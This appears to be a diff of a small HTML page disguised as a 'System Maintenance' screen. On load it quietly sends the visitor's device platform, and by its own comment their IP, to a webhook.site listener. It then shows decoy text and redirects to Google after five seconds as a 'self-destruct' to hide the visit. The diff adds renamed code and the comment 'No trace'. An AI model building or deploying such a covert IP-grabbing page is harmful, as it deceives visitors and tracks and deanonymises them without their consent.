@@ -1,25 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update</title>
+    <title>System Maintenance</title>
     <script>
-        function startOperation() {
-            // 1. DATA PING: Replace with your Webhook.site URL
-            const listener = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
-            
-            // Send the IP data immediately
-            navigator.sendBeacon(listener + "?device=" + navigator.platform + "&status=deployed");
+        function triggerAlpha() {
+            // YOUR VERIFIED WEBHOOK.SITE URL
+            const radar = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
 
-            // 2. THE SELF-DESTRUCT: Redirect to Google after 5 seconds
-            // We use 5 seconds for testing so you aren't waiting too long.
+            // 1. DATA PING (No trace, sends IP instantly)
+            navigator.sendBeacon(radar + "?status=deployed&device=" + navigator.platform);
+
+            // 2. THE SELF-DESTRUCT (5-second delay to ensure ping finishes)
             setTimeout(function() {
                 window.location.replace("https://www.google.com");
             }, 5000);
         }
-        window.onload = startOperation;
+        window.onload = triggerAlpha;
     </script>
 </head>
-<body style="background-color: black; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p>Loading encrypted resource...</p>
+<body style="background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+    <p>Connecting to secure server...</p>
 </body>
 </html>
